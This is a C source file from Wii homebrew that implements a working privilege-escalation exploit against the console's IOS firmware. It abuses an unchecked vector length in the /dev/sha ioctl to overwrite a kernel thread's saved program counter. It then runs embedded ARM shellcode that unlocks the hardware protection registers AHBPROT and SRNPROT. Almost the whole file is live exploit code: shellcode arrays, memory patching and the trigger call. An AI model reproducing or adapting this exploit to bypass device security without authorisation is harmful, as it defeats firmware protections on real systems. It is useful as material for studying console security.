/*
    ios_hax.c - /dev/sha IOS exploit implementation
    by Emma / InvoxiPlayGames (https://ipg.gay)

    based on the work of https://github.com/mkwcat
    (exploit discovery, THUMB shellcode)
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdbool.h>
#include <gccore.h>

//#define IOSHAX_SHUTUP

#ifndef IOSHAX_SHUTUP
#define IOSHAX_printf(...) printf(__VA_ARGS__)
#else
#define IOSHAX_printf(...)
#endif // IOSHAX_SHUTUP

#define HW_SRNPROT (*(uint32_t *)0xCD800060)
#define HW_AHBPROT (*(uint32_t *)0xCD800064)

uint32_t mem1_prepare[7] = {
    0x4903468D, // ldr r1, =0x10100000; mov sp, r1;
    0x49034788, // ldr r1, =entrypoint; blx r1;
    /* Overwrite reserved handler to loop infinitely */
    0x49036209, // ldr r1, =0xFFFF0014; str r1, [r1, #0x20];
    0x47080000, // bx r1
    0x10100000, // temporary stack
    0x41414141, // entrypoint
    0xFFFF0014, // reserved handler
};

uint32_t mem1_backup[7] = {0};

uint32_t arm_payload[] = {
    0xE3A04536, // mov r4, #0x0D800000
    // HW_AHBPROT = 0xFFFFFFFF
    0xE3E05000, // mov r5, #0xFFFFFFFF
    0xE5845064, // str r5, [r4, #0x64]
    // HW_SRNPROT |= 0x8
    0xE5945060, // ldr r5, [r4, #0x60]
    0xE3955008, // orrs r5, #0x8
    0xE5845060, // str r5, [r4, #0x60]
    0xE12FFF1E, // bx lr
};

bool IOSHAX_ClaimPPCKERN() {
    IOSHAX_printf("AHBPROT: %08x\n", HW_AHBPROT);
    IOSHAX_printf("SRNPROT: %08x\n", HW_SRNPROT);
    // check if we already have permissions
    if ((HW_AHBPROT & 0x80000000) == 0x80000000) {
        IOSHAX_printf("already got PPCKERN\n");
        HW_SRNPROT |= 8;
        return true;
    }
    IOSHAX_printf("need PPCKERN, elevate permissions\n");

    // backup the start, then copy our shellcode to mem1
    uint32_t *mem1 = (uint32_t *)0x80000000;
    memcpy(mem1_backup, mem1, sizeof(mem1_backup));
    memcpy(mem1, mem1_prepare, sizeof(mem1_prepare));
    // set our payload entrypoint
    mem1[5] = (uint32_t)MEM_K0_TO_PHYSICAL(arm_payload);
    DCFlushRange(mem1, 0x20);

    // open /dev/sha
    int fd = IOS_Open("/dev/sha", IPC_OPEN_NONE);
    // prepare our exploit ioctl
    ioctlv vec[3]; // 1 input, 2 output
    vec[0].data = NULL;
    vec[0].len = 0;
    // output SHA-1 context
    // exploit is here! this is kernel idle thread context
    // SHA1_Init will write 0 to the PC save here, since the length
    // of the vector is unchecked
    vec[1].data = (void *)0xFFFE0028;
    vec[1].len = 0;
    // cache consistency
    vec[2].data = MEM_K0_TO_PHYSICAL(0x80000000);
    vec[2].len = 0x20;
    // trigger!
    IOSHAX_printf("triggering exploit...");
    IOS_Ioctlv(fd, 0, 1, 2, vec);
    sleep(1); // we have to wait a bit
    IOSHAX_printf("returned from trigger\n");
    IOSHAX_printf("AHBPROT: %08x\n", HW_AHBPROT);
    IOSHAX_printf("SRNPROT: %08x\n", HW_SRNPROT);
    if ((HW_AHBPROT & 0x80000000) == 0x80000000) {
        IOSHAX_printf("exploit successful\n");
        return true;
    } else {
        IOSHAX_printf("exploit failed\n");
        return false;
    }
}
